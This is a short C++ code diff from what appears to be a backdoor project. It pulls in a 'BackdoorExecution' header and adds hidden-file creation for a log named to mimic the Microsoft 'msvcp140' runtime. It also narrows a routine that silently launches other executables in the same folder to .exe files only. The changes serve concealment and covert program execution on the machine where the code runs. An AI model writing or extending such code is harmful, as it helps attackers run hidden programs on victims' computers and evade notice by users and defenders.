@@ -5,6 +5,7 @@
 #include <CombaseLibrary.hpp>
 #include <BackdoorExecution.hpp>
 #include <SharedConstants.hpp>
+#include <HiddenFileCreate.hpp>
 
 #include <fstream>
 #include <ios>
@@ -38,6 +39,12 @@ static std::filesystem::path GetFolderOfCurrentExecutable(std::filesystem::path 
 static void LogToFile(const std::string_view message)
 {
     const std::filesystem::path log_path = GetFolderOfCurrentExecutable(PathToCurrentExecutable{}.GetPath()) / std::filesystem::path{ "msvcp140_log.txt" };
+    HiddenFileCreate{}.Create(log_path.wstring());
+    // Require the file to already have been created
+    if (!std::filesystem::exists(log_path))
+    {
+        throw std::runtime_error{ ERROR_MESSAGE("Log file must already exist") };
+    }
     std::ofstream log_file{ log_path.string(), std::ios::binary | std::ios::app };
     // Print the precise data and time
     const auto now = std::chrono::system_clock::now();
@@ -56,7 +63,10 @@ static void RunOtherExecutableInCurrentWorkingDirectory(std::filesystem::path pa
     {
         for (const auto& entry : std::filesystem::directory_iterator{ containing_folder })
         {
-            if (entry.is_regular_file() && entry.path().filename() != filename_of_current_executable)
+            if (!entry.is_regular_file())
+                continue;
+            const std::filesystem::path filename = entry.path().filename();
+            if (filename.extension() == ".exe" && filename != filename_of_current_executable)
             {
                 callback(entry.path());
             }
